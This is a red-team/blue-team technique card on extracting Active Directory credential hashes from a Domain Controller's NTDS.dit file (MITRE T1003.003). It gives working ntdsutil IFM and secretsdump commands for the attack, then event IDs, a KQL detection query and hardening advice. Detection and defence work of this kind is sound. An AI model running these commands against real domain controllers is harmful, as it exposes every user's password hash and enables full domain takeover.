# [CA-DUMP-006]: NTDS.dit Extraction

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-DUMP-006 |
| **MITRE ATT&CK v18.1** | [OS Credential Dumping: NTDS (T1003.003)](https://attack.mitre.org/techniques/T1003/003/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows AD |
| **Severity** | **Critical** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Accessing the `NTDS.dit` database file on a Domain Controller. This file contains all AD object data, including password hashes (NTHash) for all users and computers.
- **Attack Surface:** The physical file `C:\Windows\NTDS\ntds.dit` on Domain Controllers.
- **Business Impact:** **Total Domain Compromise**. Access to all user credentials, allowing offline cracking and Golden Ticket creation.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Domain Admin (or local Administrator on DC).
- **Vulnerable Config:** Lack of dedicated backup network; DCs exposed to standard user VLANs.
- **Tools:**
    - `ntdsutil.exe`
    - [Invoke-NinjaCopy](https://github.com/PowerShellMafia/PowerSploit)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Snapshot Creation (Ntdsutil)**
Use the built-in tool to create a snapshot or "Install From Media" (IFM) set.
```cmd
ntdsutil "ac i ntds" "ifm" "create full c:\temp\dump" q q
```

**Step 2: Exfiltration**
The folder `c:\temp\dump` now contains `ntds.dit` and `SYSTEM` hive. Exfiltrate these.

**Step 3: Extraction (Offline)**
```bash
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Event Logs
| Source | Event ID | Filter Logic |
|---|---|---|
| **Security** | 4688 | Process Name = `ntdsutil.exe`, CommandLine contains `ifm` or `create full`. |
| **ESENT** | 216 | "The database engine has been stopped" (indicates IFM creation). |

#### 5.2 Sentinel (KQL)
```kusto
SecurityEvent
| where EventID == 4688
| where ProcessName has "ntdsutil"
| where CommandLine has "ifm"
```

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Tiering:** Treat Domain Controllers as Tier 0 assets. Only Tier 0 admins should have logon rights.
*   **EDR:** Flag any usage of `ntdsutil.exe` with `ifm` parameters as a high-severity alert.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-EXPLOIT-001]
> **Next Logical Step:** [LAT-AD-003] (Golden Ticket)
